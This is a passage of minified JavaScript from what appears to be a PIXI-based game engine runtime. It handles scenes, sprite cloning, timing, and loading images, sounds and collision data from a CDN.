        get: function () {
            return this.uvMatrix.clampMargin;
        },
        set: function (t) {
            this.uvMatrix.clampMargin = t, this.uvMatrix.update(!0);
        }
    }, {
        key: "tileScale",
        get: function () {
            return this.tileTransform.scale;
        },
        set: function (t) {
            this.tileTransform.scale.copyFrom(t);
        }
    }, {
        key: "tilePosition",
        get: function () {
            return this.tileTransform.position;
        },
        set: function (t) {
            this.tileTransform.position.copyFrom(t);
        }
    }, {
        key: "width",
        get: function () {
            return this._width;
        },
        set: function (t) {
            this._width = t;
        }
    }, {
        key: "height",
        get: function () {
            return this._height;
        },
        set: function (t) {
            this._height = t;
        }
    }, {
        key: "scale",
        get: function () {
            return {
                x: this._width / this.texture.width,
                y: this._height / this.texture.height
            };
        }
    }]), r;
}(), Scene$1 = function () {
    function s(t) {
        var e = t.id, i = t.config, n = t.app, t = t.styles;
        classCallCheck(this, s), this.id = e, this.app = n, this.config = i, this.backgroundColor = i.backgroundColor,
            this.styles = t, this.camera = new PIXI__namespace.Container(), this.map = new PIXI__namespace.Container(),
            this.camera.id = e, this.map.id = e, this.cache = Object.create(null);
    }
    return createClass(s, [{
        key: "destroy",
        value: function () {
            this._debugOutline = null, this.camera.destroy(!0), this.camera = null, this.map.destroy();
        }
    }, {
        key: "addSprite",
        value: function (t, e) {
            var i = t.id, n = t.type, s = t.currentStyleId, r = void 0 === (r = t.textureMap) ? {} : r, a = t.mother, o = void 0, l = void 0;
            switch (s && "defaultText" !== s && "styles_0" !== s && (o = r[s] && r[s].length && r[s][0].texture),
            n) {
                case "plugin":
                    l = new PluginSprite(i, t, this.app);
                    break;

                case "background":
                    l = new Background(i, o, t, this.app);
                    break;

                case "variable":
                    l = new Variable(i, _extends$1({}, t, {
                        frames: this.app.runtimeData.styles[t.currentStyleId].frame
                    }), this.app);
                    break;

                case "text":
                    l = new Text(t, this.app);
                    break;

                case "container":
                    l = new Sprite(i, o, t, this.app);
                    break;

                default:
                    l = new (0 === t.repeat ? TilingSprite : Sprite)(i, o, t, this.app);
            }
            return this.createLayer({
                id: i,
                mother: a,
                ContainerID: e
            }, l), l.ContainerID = e, l._scene = this, l;
        }
    }, {
        key: "createLayer",
        value: function (t, e) {
            var i = t.id, n = t.mother, t = t.ContainerID, s = this.app.runtimeData.scenes[this.id].clones[n];
            if (s) {
                var r = s[s.length - 1];
                if (t && this.cache[t]) -1 === (s = this.cache[t].children.findIndex(function (t) {
                    return t.id && (t.id === r || t.id === n);
                })) ? this.cache[t].addChild(e) : this.cache[t].addChildAt(e, s + 1); else {
                    s = void 0;
                    try {
                        var a = this.cache[r] || this.cache[n];
                        a.parent === this.camera ? s = this.camera.getChildIndex(a) : a.parent === this.map && (s = this.map.getChildIndex(a));
                    } catch (t) {
                        s = this.camera.getChildIndex(this.cache[n]);
                    }
                    this.camera.addChildAt(e, s + 1);
                }
            } else (t ? this.cache[t] : this.camera).addChild(e);
            this.cache[i] = e;
        }
    }, {
        key: "drawRectFrame",
        value: function (t, e) {
            if (e = e.replace("#", "0x"), this._debugOutline) try {
                this._debugOutline.clear();
            } catch (t) { } else this._debugOutline = new PIXI__namespace.Graphics(), this.map.addChild(this._debugOutline);
            var i, n, s, r;
            (t = this.cache[t]) && (this._debugOutline.lineStyle(3, e, 1, .5, !1, "PIXI.LINE_CAP.ROUND"),
                i = (e = t.getAABB()).width, n = e.height, s = e.x - this.app.gameWidth / 2, r = e.y - this.app.gameHeight / 2,
                t.constructor === PluginSprite ? (s = e.x - e.width / 2, r = e.y - e.height / 2) : "background" === t.type && (i = t.gameWidth,
                    n = t.gameHeight, s = -this.app.gameWidth / 2, r = -this.app.gameHeight / 2), this._debugOutline.drawRect(s, r, i, n),
                this._debugOutline.endFill());
        }
    }]), s;
}(), Scene = function () {
    function u(t) {
        var e = t.config, i = void 0 === (i = t.type) ? "scene" : i, n = t.spritesList, s = t.components, r = void 0 === (r = t.resource) ? {} : r, t = t.vm, a = (classCallCheck(this, u),
            e.id), o = e.name, l = void 0 === (l = e.tpls) ? [] : l, h = e.backgroundColor, e = (this.config = e,
                this.id = a, this.name = o, "scene" === i && (this.backgroundColor = h), this.tpls = l,
                this.type = i, this.vm = t, this.app = t.renderer, this.spritesList = n, this.components = s,
                r.pack), a = r.styles, o = r.sounds;
        this.pack = e, this.styles = a, this.sounds = o, this.eventEmitter = getEventEmitter(),
            this.background = Object.create(null), this.layers = [], this.clones = {}, this.sprites = [],
            this.cache = Object.create(null), this.pool = Object.create(null), this.texture_list = [],
            this.renderer = new Scene$1({
                id: this.id,
                config: this,
                styles: a,
                app: this.app
            }), this.isSpriteReady = !1, this.isSleeping = !1;
    }
    return createClass(u, [{
        key: "init",
        value: function () {
            var t = this.config.sprites;
            this.installSprites(t), this.isSpriteReady = !0, this.eventEmitter.emit("onLoad");
        }
    }, {
        key: "installSprites",
        value: function (t, e) {
            if (!this.isSpriteReady) for (var i = 0; i < t.length; i++) {
                var n, s, r, a, o = t[i], l = this.spritesList[o];
                l ? "template" === this.type && "background" === l.type || (r = l.origin, a = l.type,
                    n = l.children, r = this.components[r] || {}, s = l.properties, l = objectWithoutProperties(l, ["properties"]),
                    l = Object.assign({}, r, _extends$1({}, l, {
                        properties: _extends$1({}, r.properties, s)
                    })), r = new Sprite$1({
                        config: l,
                        isOriginal: !0,
                        vm: this.vm,
                        stylesMap: this.styles,
                        sceneRenderer: this.renderer,
                        ContainerID: e
                    }), "background" === a && (this.background = r), this.sprites.push(r), this.layers.push(r),
                    this.clones[o] = [], this.cache[o] = r, Performance.startPointToList("afterRenderObjectReady"),
                    r.afterRenderObjectReady(), Performance.endPointToList("afterRenderObjectReady"),
                    "container" === a && 0 < n.length && this.installSprites(n, o)) : (s = this.vm.runtimeData.scenes[o]) && (r = (l = s.renderer).camera,
                        a = l.map, this.renderer.camera.addChild(r), this.renderer.map.addChild(a));
            }
        }
    }, {
        key: "activate",
        value: function () {
            var t = 0 < arguments.length && void 0 !== arguments[0] && arguments[0];
            if (this.isSleeping = !1, this.isSpriteReady) for (var e = this.renderer.camera.children.map(function (t) {
                return t.id;
            }), i = 0; i < this.config.sprites.length; i++) {
                var n, s = this.config.sprites[i];
                0 <= this.tpls.indexOf(s) && -1 === e.indexOf(s) && (n = (s = this.vm.runtimeData.scenes[s].renderer).camera,
                    s = s.map, this.renderer.camera.addChildAt(n, i), this.renderer.map.addChild(s));
            } else this.init();
            var r = !0, a = !1, o = void 0;
            try {
                for (var l, h = this.tpls[Symbol.iterator](); !(r = (l = h.next()).done); r = !0) {
                    var u = l.value, c = this.vm.runtimeData.scenes[u];
                    console.log("begin to active template", u), c.activate();
                }
            } catch (t) {
                a = !0, o = t;
            } finally {
                try {
                    !r && h.return && h.return();
                } finally {
                    if (a) throw o;
                }
            }
            this.sprites.forEach(function (t) {
                t.bindHats();
            }), this.backgroundColor && (this.app.renderer.backgroundColor = parseInt(this.backgroundColor, 16)),
                this.renderer.map.visible = !0, this.renderer.camera.visible = !0, this.app.rankInit(this.vm.runtimeData),
                this.app.collisionManager.loadColliders(unique(this.vm.runtimeData.collision_pairs[this.id])),
                "template" !== this.type && (t || this.eventEmitter.emit(OPCODE.eventSwitchScene, {
                    OPTION_LIST: this.id
                }), this.eventEmitter.emit(OPCODE.eventSceneStart, {
                    OPTION_LIST: "_start_"
                }), console.log("Scene：" + this.id + " activated"));
        }
    }, {
        key: "update",
        value: function (e) {
            var i = this;
            this.sprites.forEach(function (t) {
                t.update(e);
            }), this.tpls.forEach(function (t) {
                i.vm.runtimeData.scenes[t].update(e);
            });
        }
    }, {
        key: "sleep",
        value: function () {
            this.isSleeping = !0, this.sprites.forEach(function (t) {
                t._behaviorInst.Physical && t._behaviorInst.Physical.behaviorType.clear(), t.renderer.destroyOutlineCollider(),
                    t.offHats();
            });
            var t = !0, e = !1, i = void 0;
            try {
                for (var n, s = this.tpls[Symbol.iterator](); !(t = (n = s.next()).done); t = !0) {
                    var r = n.value;
                    this.vm.runtimeData.scenes[r].sleep();
                }
            } catch (t) {
                e = !0, i = t;
            } finally {
                try {
                    !t && s.return && s.return();
                } finally {
                    if (e) throw i;
                }
            }
        }
    }, {
        key: "hide",
        value: function () {
            this.renderer.map.visible = !1, this.renderer.camera.visible = !1;
        }
    }, {
        key: "makeClone",
        value: function (t, e) {
            var i = 2 < arguments.length && void 0 !== arguments[2] && arguments[2], n = t.type, s = t.config, r = t.id, a = t.isOriginal, o = t.mother, l = t.parent, t = t.children, h = void 0 === t ? [] : t, t = a ? r : o, a = [];
            if (a = this.clones[t] || a) {
                var r = void 0, u = "__" + s.name + "_clone_" + uid() + "__";
                if (this.pool[t] && this.pool[t].length ? ((r = this.pool[t].pop()).reset({
                    id: u,
                    mother: t,
                    creator: e,
                    ContainerID: l
                }), r.wake()) : r = new Sprite$1({
                    config: Object.assign({}, s, {
                        id: u,
                        mother: t,
                        creator: e
                    }),
                    isOriginal: !1,
                    vm: this.vm,
                    stylesMap: this.styles,
                    sceneRenderer: this.renderer,
                    ContainerID: l || null
                }), "container" === n && 0 < h.length) {
                    for (var c = [], p = 0; p < h.length; p++) {
                        var d = this.makeClone(Object.assign(this.cache[h[p]], {
                            parent: u
                        }), e);
                        c.push(d.id);
                    }
                    r.children = c;
                }
                return r.isCloned = !0, a.push(u), this.sprites.push(r), (this.cache[u] = r).afterRenderObjectReady(),
                    this.eventEmitter.emit(VMEventType.clone, null, u, null, null, i), r;
            }
            console.error("can't find original clone list");
        }
    }, {
        key: "deleteClone",
        value: function (t, e) {
            var i = this.cache[t];
            if ("container" === i.type && 0 < i.children.length) for (var n = 0; n < i.children.length; n++) {
                var s = this.cache[i.children[n]];
                s && this.deleteClone(s.id, s.mother);
            }
            for (var r = this.sprites.indexOf(i), a = (i.sleep(), this.sprites.splice(r, 1),
                this.clones[e] || []), o = 0; o < a.length; o++) if (a[o] === t) {
                    a.splice(o, 1);
                    break;
                }
            this.pool[e] || (this.pool[e] = []), this.pool[e].push(i), i.release(), i.renderer.destroyOutlineCollider(),
                i = null, delete this.cache[t];
        }
    }, {
        key: "release",
        value: function () {
            for (; this.sprites.length;) {
                var t = this.sprites.pop();
                t.release(), t.dispose(), t = null;
            }
            this.renderer.destroy(), this.renderer = null, this.config = null, this.tpls = null,
                this.type = null, this.vm = null, this.app = null, this.spritesList = null, this.components = null,
                this.pack = null, this.styles = null, this.sounds = null, this.eventEmitter = null,
                this.background = null, this.layers = null, this.clones = null, this.sprites = null,
                this.cache = null, this.pool = null, this.texture_list = null;
        }
    }]), u;
}(), Clock = function () {
    function e(t) {
        classCallCheck(this, e), this._projectTimer = new Timer(), this._projectTimer.start(),
            this._pausedTime = null, this._paused = !1, this._runtime = t;
    }
    return createClass(e, [{
        key: "projectTimer",
        value: function () {
            return this._paused ? this._pausedTime / 1e3 : this._projectTimer.duration;
        }
    }, {
        key: "update",
        value: function () {
            this._projectTimer.frameClock(this._runtime._frameTime);
        }
    }, {
        key: "pause",
        value: function () {
            this._paused = !0, this._pausedTime = this._projectTimer.timeElapsed();
        }
    }, {
        key: "resume",
        value: function () {
            this._paused = !1;
            var t = this._projectTimer.timeElapsed() - this._pausedTime;
            this._projectTimer.startTime += t;
        }
    }, {
        key: "resetProjectTimer",
        value: function () {
            this._projectTimer.start();
        }
    }]), e;
}(), cdn_url$1 = Config.cdn_url;

function getResourceList(t, e, i) {
    for (var n = [], s = [], r = [], a = [], o = 0; o < e.length; o++) {
        var l = e[o], h = t.sprites[l], l = !!(t.components[h.origin].plugins || []).filter(function (t) {
            return -1 < OUTLINE_OPCODE.indexOf(t.id);
        }).length;
        if (h) {
            if (h.pluginProperties) for (var u in h.pluginProperties) /^https:\/\/gamemaker\.qpic\.cn\/luban\//.test(h.pluginProperties[u].value) && s.push({
                url: h.pluginProperties[u].value,
                type: "image",
                blob_id: h.pluginProperties[u].value.replace(/^https:\/\/gamemaker\.qpic\.cn\/luban\//, "")
            });
            var c = h.origin, p = h.type, d = void 0 === (d = h.children) ? [] : d, g = (c = t.components[c] || {}).styles, c = c.blocks, l = (g = getTextureInfo(void 0 === g ? [] : g, t.styles, i, l)).resource_list, g = g.c_frame_list, c = getSoundsInfo(c, t.sounds, t.procedures);
            n.push.apply(n, toConsumableArray(l)), r.push.apply(r, toConsumableArray(c)), a.push.apply(a, toConsumableArray(g)),
                "container" === p && 0 < d.length && (c = (l = getResourceList(t, d, i)).resource_list,
                    g = l.collision_frame_list, p = l.audio_list, n.push.apply(n, toConsumableArray(c)),
                    a.push.apply(a, toConsumableArray(g)), r.push.apply(r, toConsumableArray(p)));
        }
    }
    return {
        resource_list: n = Array.from(new Map(n.map(function (t) {
            return [t.id, t];
        })).values()),
        collision_frame_list: a,
        audio_list: r,
        plugin_resource_list: s
    };
}

function getAllCollisionPairs(t, e) {
    for (var i = [], n = [], s = 0; s < e.length; s++) {
        var r, a, o = e[s], l = t.sprites[o];
        l && (r = l.origin, a = l.type, l = void 0 === (l = l.children) ? [] : l, r = (o = getCollisionInfo(o, (t.components[r] || {}).blocks, t, r)).c_style_list,
            o = o.pairs, i.push.apply(i, toConsumableArray(r)), n.push.apply(n, toConsumableArray(o)),
            "container" === a) && 0 < l.length && (o = (r = getAllCollisionPairs(t, l)).styles,
                a = r.pairs, i.push.apply(i, toConsumableArray(o)), n.push.apply(n, toConsumableArray(a)));
    }
    return {
        styles: i,
        pairs: n
    };
}

function getCollisionInfo(t, e, i, n) {
    for (var s = [], r = [], a = getBlockFeilds(e, [OLDCODE_TRANSFORM_NEWCODE.ssc, OPCODE.eventObjectTouchingObject, OLDCODE_TRANSFORM_NEWCODE.ssi]), o = 0; o < a.length; o++) {
        var l = (h = a[o]).OPTION_LIST1, h = h.OPTION_LIST2, l = "_self_" === (l = void 0 === l ? {} : l).value ? n : l.value;
        (h = (void 0 === h ? {} : h).value) && 0 <= h.indexOf("_edge_") || (l && h && r.push([l, h]),
            s.push.apply(s, toConsumableArray(getSpriteStyles(l, i)).concat(toConsumableArray(getSpriteStyles(h, i)))));
    }
    for (var u = getBlockFeilds(e, OLDCODE_TRANSFORM_NEWCODE.bb), c = 0; c < u.length; c++) {
        var p = u[c].OPTION_LIST;
        (p = void 0 === p ? {} : p).value && 0 <= p.value.indexOf("_edge_") || (r.push([t, p.value]),
            s.push.apply(s, toConsumableArray(getSpriteStyles(t, i)).concat(toConsumableArray(getSpriteStyles(p.value, i)))));
    }
    return {
        c_style_list: s,
        pairs: r
    };
}

function getSpriteStyles(t, e) {
    return e.components[t] ? e.components[t].styles || [] : e.sprites[t] && (t = e.sprites[t].origin,
        e.components[t].styles) || [];
}

function getTextureInfo(i, n, s, r) {
    for (var a = [], o = [], t = 0; t < i.length; t++) !function (t) {
        var e = i[t], t = (t = n[e]) ? (t.frame || (t.frame = [{
            id: e
        }]), t.frame.filter(function (t) {
            return t.id && !t.is_pack;
        }).map(function (t) {
            return -1 < s.indexOf(e) && o.push(t.id), {
                id: t.id,
                type: "image",
                url: cdn_url$1 + t.id,
                isCollision: -1 < s.indexOf(e) || r
            };
        })) : [];
        a.push.apply(a, toConsumableArray(t));
    }(t);
    return {
        resource_list: a,
        c_frame_list: o
    };
}

function getSoundsInfo(t, e) {
    var i, n = 2 < arguments.length && void 0 !== arguments[2] ? arguments[2] : {}, s = [], r = [OLDCODE_TRANSFORM_NEWCODE.sp, OLDCODE_TRANSFORM_NEWCODE.spb, OLDCODE_TRANSFORM_NEWCODE.spsaw, OLDCODE_TRANSFORM_NEWCODE.spm], a = getBlockFeilds(t, r);
    for (i in n) a = a.concat(getBlockFeilds(n[i].blocks, r));
    for (var o = 0; o < a.length; o++) {
        var l = a[o].OPTION_LIST, h = e[l = (void 0 === l ? {} : l).value];
        h && s.push({
            id: h.id,
            url: cdn_url$1 + l.replace(/^audio_/, ""),
            type: "sound"
        });
    }
    return s;
}

var ASSETPATH, fs, RuntimeData = function () {
    function i(t, e) {
        classCallCheck(this, i), this.config = t, this.vm = e, this.app = e.renderer, this.mainScene = t.mainScene,
            this.eventEmitter = getEventEmitter(), this.collision_pairs = Object.create(null),
            this.resourceProgress = Object.create(null), this.downloadQueue = {
                status: 0,
                process: [],
                waiting: []
            }, this.initData(), this.makeClone = this.makeClone.bind(this), this.boot = this.boot.bind(this);
    }
    return createClass(i, [{
        key: "initData",
        value: function (t, e) {
            var i = this, n = (o = this.config).mainScene, s = o.styles, r = o.sounds, a = o.variables, o = o.components;
            if (this.scenes = Object.create(null), this.components = o, this.styles = s, this.sounds = r,
                !e) {
                for (var l in this.globalVariables = Object.create(null), a) {
                    var h = (p = a[l]).varId, u = p.varName, c = p.varType, p = p.varValue;
                    this.globalVariables[h] = new Variable$1(h, u, c, p), this.globalVariables[h].visible = a[l].visible,
                        this.globalVariables[h].style = a[l].style, this.globalVariables[h].x = a[l].x,
                        this.globalVariables[h].y = a[l].y;
                }
                this.current_scene_id = n;
            }
            this.eventEmitter.once("startLoad", function () {
                i.initScene(i.current_scene_id), 1 === i.config.meta.resource_load_method ? i.loadResource(i.current_scene_id).then(function () {
                    isMiniGame && (!t || GameGlobal.isPublic) || (console.log("启动线程1"), i.boot());
                }) : i.loadAllResource().then(function () {
                    isMiniGame && (!t || GameGlobal.isPublic) || (console.log("启动线程2"), i.boot());
                });
            }), this.cache = Object.create(null);
        }
    }, {
        key: "boot",
        value: function () {
            var t = this;
            console.log("触发boot", this.playing), this.playing || (console.log("执行boot"), Performance.startPoint("boot"),
                this.playing = !0, this.app.ui.loadingUI.hide(), isMiniGame && setTimeout(function () {
                    t.app && t.app.ui.gameInfo.infoHide();
                }, 0), this.app.initGame(), this.currentScene.init(), this.currentScene.activate(!0),
                this.clock = new Clock(this.vm), this.eventEmitter.emit(OPCODE.eventGameStart),
                this.vm.isStageReady = !0, this.vm._blockEngine.runThreadStatus(), Performance.endPoint("boot"));
        }
    }, {
        key: "preLoadNextSceneRes",
        value: function () {
            var t, e = this.getBlockFeildsValue(OLDCODE_TRANSFORM_NEWCODE.cs, this.current_scene_id);
            e && e.length && (e = unique(e.map(function (t) {
                return t.OPTION_LIST.value || "";
            })), 0 !== this.downloadQueue.status ? (t = this.downloadQueue.waiting).push.apply(t, toConsumableArray(e)) : this.buildQueue(e));
        }
    }, {
        key: "buildQueue",
        value: function (t) {
            var e, i = this, n = (this.downloadQueue.status = 1, (e = this.downloadQueue.process).push.apply(e, toConsumableArray(t)),
                console.log("Begin to load scene resources: " + t), []);
            t.forEach(function (t) {
                i.resourceProgress[t] || n.push(i.loadResource.bind(i, t));
            }), n.reduce(function (t, e) {
                return t.then(function () {
                    return e();
                });
            }, Promise.resolve());
        }
    }, {
        key: "preloadSceneRes",
        value: function (t) {
            0 !== this.downloadQueue.status ? this.downloadQueue.waiting.push(t) : this.buildQueue([t]);
        }
    }, {
        key: "update",
        value: function () {
            for (var t in this.cache) delete this.cache[t];
            this.clock && this.clock.update();
        }
    }, {
        key: "releaseScene",
        value: function (t) {
            if (t === this.current_scene_id) throw "不能销毁当前场景";
            var e = this.scenes[t];
            e && (e.release(), e = null, delete this.scenes[t]);
        }
    }, {
        key: "initScene",
        value: function (t) {
            if (t = t || this.config.mainScene, this.scenes[t]) return this.scenes[t];
            var e, i;
            if (this.installTemplates(t), this.config.scenes[t]) return this.scenes[t] = new Scene({
                config: this.config.scenes[t],
                spritesList: this.config.sprites,
                components: this.components,
                resource: {
                    pack: this.config.pack_list,
                    styles: this.config.styles,
                    sounds: this.sounds
                },
                vm: this.vm
            }), e = (i = this.scenes[t].renderer).camera, i = i.map, this.app.camera.addChild(e),
                this.app.stage.addChild(i), this.scenes[t];
            throw new SceneConfigMissing(t);
        }
    }, {
        key: "installTemplates",
        value: function (t) {
            var e = void 0 === (e = this.config.scenes[t].tpls) ? [] : e, i = !0, n = !1, s = void 0;
            try {
                for (var r, a = e[Symbol.iterator](); !(i = (r = a.next()).done); i = !0) {
                    var o = r.value;
                    if (!this.scenes[o]) {
                        if (!this.config.scenes[o]) throw new SceneConfigMissing(t);
                        this.scenes[o] = new Scene({
                            config: this.config.scenes[o],
                            type: "template",
                            spritesList: this.config.sprites,
                            components: this.components,
                            resource: {
                                pack: this.config.pack_list,
                                styles: this.config.styles,
                                sounds: this.sounds
                            },
                            vm: this.vm
                        });
                    }
                }
            } catch (t) {
                n = !0, s = t;
            } finally {
                try {
                    !i && a.return && a.return();
                } finally {
                    if (n) throw s;
                }
            }
        }
    }, {
        key: "filterArrObject",
        value: function (t) {
            var e = [], i = [];
            return t.forEach(function (t) {
                -1 === i.indexOf(t.id) && (i.push(t.id), e.push(t));
            }), e;
        }
    }, {
        key: "loadResource",
        value: function (i) {
            var n = this;
            if (i = i || this.config.mainScene, this.resourceProgress[i]) {
                if (100 === this.resourceProgress[i]) return new Promise(function (t) {
                    !n.playing && window.isPublic && (console.log("进度加载完毕，触发startCbk"), n.app.ui.gameInfo.startCbk) && n.app.ui.gameInfo.startCbk(),
                        t();
                });
            } else this.app.loaderManager.progress = 0, this.resourceProgress[i] = 1;
            var t = (e = this.config.scenes[i]).sprites, e = (void 0 === (e = e.tpls) ? [] : e).reduce(function (t, e) {
                return t.concat(n.config.scenes[e].sprites);
            }, [].concat(toConsumableArray(t))), s = (t = getAllCollisionPairs(this.config, e)).styles, t = t.pairs, r = (e = getResourceList(this.config, e, s)).resource_list, a = e.audio_list, o = e.collision_frame_list, l = e.plugin_resource_list, a = this.filterArrObject(a);
            return this.collision_pairs[i] = uniqueArr(t), this.config.pack_list || (this.config.pack_list = Object.create(null)),
                new Promise(function (e) {
                    n.app.loaderManager.load(r, a, n.config.pack_list[i], o, l, function () {
                        n.resourceProgress[i] = 100, console.log("scene", i, "resource loaded"), n.eventEmitter.emit("SCENE_RES_LOADED__" + i);
                        var t = n.downloadQueue.process.indexOf(i);
                        n.downloadQueue.process.splice(t, 1), 0 === n.downloadQueue.process.length && (0 < n.downloadQueue.waiting.length ? (n.buildQueue(n.downloadQueue.waiting),
                            n.downloadQueue.waiting = []) : n.downloadQueue.status = 0), e();
                    });
                });
        }
    }, {
        key: "loadAllResource",
        value: function () {
            var n = this, t = (console.log("触发加载资源 loadAllResource"), Object.keys(this.config.sprites)), s = [];
            Object.values(this.config.scenes).forEach(function (t) {
                var e = t.id, t = t.sprites, i = (t = getAllCollisionPairs(n.config, t)).styles, t = t.pairs;
                n.collision_pairs[e] = uniqueArr(t), s.push.apply(s, toConsumableArray(i));
            }), console.log("碰撞对", this.collision_pairs);
            var e = (t = getResourceList(this.config, t, s)).resource_list, i = t.audio_list, r = t.collision_frame_list, a = t.plugin_resource_list, i = this.filterArrObject(i), o = {
                composite: [],
                extra: []
            };
            return this.config.pack_list && 0 !== Object.values(this.config.pack_list).length && Object.values(this.config.pack_list).forEach(function (t) {
                var e, i = t.composite, t = void 0 === (t = t.extra) ? [] : t;
                (e = o.composite).push.apply(e, toConsumableArray(void 0 === i ? [] : i)), (e = o.extra).push.apply(e, toConsumableArray(t));
            }), new Promise(function (t) {
                n.app.loaderManager.load(e, i, o, r, a, function () {
                    n.config && n.config.scenes && (Object.keys(n.config.scenes).forEach(function (t) {
                        n.resourceProgress[t] = 100;
                    }), t());
                });
            });
        }
    }, {
        key: "gotoScene",
        value: function (t) {
            var e, i, n = this;
            this.current_scene_id !== t && ((e = this.currentScene).sleep(), this.collisionPairs = null,
                this.current_scene_id = t, i = (i = this.scenes[t]) || this.initScene(t), this.resourceProgress[t] ? (e.hide(),
                    this.app.resetStage(), i.activate()) : (this.app.ui.loadingUI.show(), this.loadResource(t).then(function () {
                        n.app.ui.loadingUI.hide(), e.hide(), n.app.resetStage(), i.activate();
                    })));
        }
    }, {
        key: "makeClone",
        value: function (t, e) {
            var i = t.sceneRenderer.id;
            return this.scenes[i].makeClone(t, e, 2 < arguments.length && void 0 !== arguments[2] && arguments[2]);
        }
    }, {
        key: "deleteAllClones",
        value: function (t) {
            this.currentScene.clones[t] = [];
        }
    }, {
        key: "deleteClone",
        value: function (t) {
            var e = t.id, i = t.mother, t = t.sceneRenderer;
            this.scenes[t.id].deleteClone(e, i);
        }
    }, {
        key: "mergeFunc",
        value: function (t, e) {
            var i, n = uid();
            for (i in this.config.procedures[e].blocks) this.config.procedures[e].blocks[i].parentFunctionID = e + n;
            t.blocks.extend(this.config.procedures[e].blocks);
        }
    }, {
        key: "getCloneListById",
        value: function (t, e) {
            var i;
            if (e && -1 < t.indexOf("_children_") && (i = t.replace("_children_", ""), s = e.target.layerChildren.findIndex(function (t) {
                return t === i;
            }), t = e.target.children[s]), this.cache[t]) return this.cache[t];
            var e = [], n = this.currentScene.clones, s = this.currentScene.tpls, r = !0, a = !1, o = void 0;
            try {
                for (var l, h = s[Symbol.iterator](); !(r = (l = h.next()).done); r = !0) var u = l.value, n = Object.assign({}, n, this.vm.runtimeData.scenes[u].clones);
            } catch (t) {
                a = !0, o = t;
            } finally {
                try {
                    !r && h.return && h.return();
                } finally {
                    if (a) throw o;
                }
            }
            if (this.components[t]) {
                for (var c = [], p = void 0 === (s = this.components[t].layers) ? [] : s, d = 0; d < p.length; d++) {
                    var g = n[p[d]] || [];
                    c.push.apply(c, toConsumableArray(g));
                }
                c.push.apply(c, toConsumableArray(p)), e = unique(c.filter(function (t) {
                    return !!t;
                }));
            } else e = n[t] ? (a = n[t].filter(function (t) {
                return !!t;
            }), unique([t].concat(toConsumableArray(a)))) : [];
            return this.cache[t] = e;
        }
    }, {
        key: "getSpriteById",
        value: function (t) {
            var e = this.currentScene.cache[t];
            if (!e) {
                var i = this.currentScene.tpls, n = !0, s = !1, r = void 0;
                try {
                    for (var a, o = i[Symbol.iterator](); !(n = (a = o.next()).done); n = !0) {
                        var l = a.value, h = this.vm.runtimeData.scenes[l].cache[t];
                        if (h) return h;
                    }
                } catch (t) {
                    s = !0, r = t;
                } finally {
                    try {
                        !n && o.return && o.return();
                    } finally {
                        if (s) throw r;
                    }
                }
            }
            return e;
        }
    }, {
        key: "checkAndgetSpriteId",
        value: function (t) {
            var e = t.str, i = t.thread, n = void 0 !== (n = t.single) && n, t = t.type, s = (l = i.target).id, r = l.name, a = l.creator, o = l.type, l = l.collider;
            if ("_self_" === e) {
                if (t && o !== t) throw new CallBlockException(s, r, "下拉菜单所引用的资源已被删除");
                return s;
            }
            if (this.config.sprites[e]) {
                if (t && this.config.sprites[e].type !== t) throw new CallBlockException(s, r, "下拉菜单所引用的资源已被删除");
                return e;
            }
            if ("_creator_" === e) return a;
            if (-1 < e.indexOf("_children_")) {
                var h = e.replace("_children_", ""), o = i.target.layerChildren.findIndex(function (t) {
                    return t === h;
                });
                if (t = i.target.children[o]) return t;
            } else {
                if ("_collider_" === e) return l;
                if (lists.includes(e)) return e;
                if (n && this.components[e]) return e;
                if ((a = this.getCloneListById(e)).length) return a;
            }
            throw new CallBlockException(s, r, "下拉菜单所引用的资源已被删除");
        }
    }, {
        key: "checkAndGetSoundUrl",
        value: function (t, e) {
            var i = e.id, e = e.name;
            if (this.sounds[t]) return t;
            throw new CallBlockException(i, e, "音频已经被删除");
        }
    }, {
        key: "lookupVariable",
        value: function (t) {
            if (t = this.globalVariables[t]) return t;
        }
    }, {
        key: "createVariable",
        value: function (t, e, i) {
            return e = new Variable$1(t, e, i), this.globalVariables[t] = e;
        }
    }, {
        key: "reset",
        value: function (t) {
            for (var e in this.scenes) for (var i = this.scenes[e].sprites; i.length;) i.pop().release();
            this.eventEmitter && this.eventEmitter.removeAllListeners(), this.app.resetData(),
                this.playing = !1, this.initData(!0, t), this.eventEmitter.emit("startLoad");
        }
    }, {
        key: "dispose",
        value: function () {
            for (var t in this.scenes) this.scenes[t].release();
            this.config = null, this.vm = null, this.scenes = null, this.clock = null, this.app = null,
                this.eventEmitter = null, this.collision_pairs = null, this.resourceProgress = null,
                this.downloadQueue = null, this.components = null, this.styles = null, this.sounds = null,
                this.globalVariables = null, this.cache = null, this.makeClone = null, this.boot = null,
                this.playing = !1;
        }
    }, {
        key: "hasBlockOfType",
        value: function (t) {
            for (var e in this.components) if (e = this.components[e].blocks, this.searchBlocks(e, t)) return !0;
            return !1;
        }
    }, {
        key: "hasBlock",
        value: function (t) {
            var e, i = !1;
            for (e in this.scenes) for (var n = this.scenes[e].layers, s = 0; s < n.length; s++) t === n[s].id && (i = !0);
            return i;
        }
    }, {
        key: "searchBlocks",
        value: function (t, e) {
            for (var i in t) if (t[i].opcode === e) return !0;
            return !1;
        }
    }, {
        key: "getBlockFeildsValue",
        value: function (t) {
            var e = "string" == typeof t ? [t] : t, i = [];
            if (o = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : null) {
                var t = this.config, n = t.scenes, s = t.components, r = t.sprites, t = n[o].sprites, a = !0, n = !1, o = void 0;
                try {
                    for (var l, h = t[Symbol.iterator](); !(a = (l = h.next()).done); a = !0) {
                        var u, c, p, d = l.value;
                        r[d] && (c = (u = r[d]).origin, "container" !== u.type) && (p = getBlockFeilds(s[c].blocks, e),
                            i.push.apply(i, toConsumableArray(p)));
                    }
                } catch (t) {
                    n = !0, o = t;
                } finally {
                    try {
                        !a && h.return && h.return();
                    } finally {
                        if (n) throw o;
                    }
                }
            } else for (var g in this.scenes) for (var f = this.scenes[g].layers, m = 0; m < f.length; m++) {
                var y = getBlockFeilds(f[m].blocks.map, e);
                i.push.apply(i, toConsumableArray(y));
            }
            return i.length ? i : null;
        }
    }, {
        key: "currentScene",
        get: function () {
            return this.scenes[this.current_scene_id];
        }
    }, {
        key: "isResourceReady",
        get: function () {
            return 100 === this.resourceProgress[this.current_scene_id];
        }
    }]), i;
}();

function HowlerMiddleware(i, n) {
    var t;
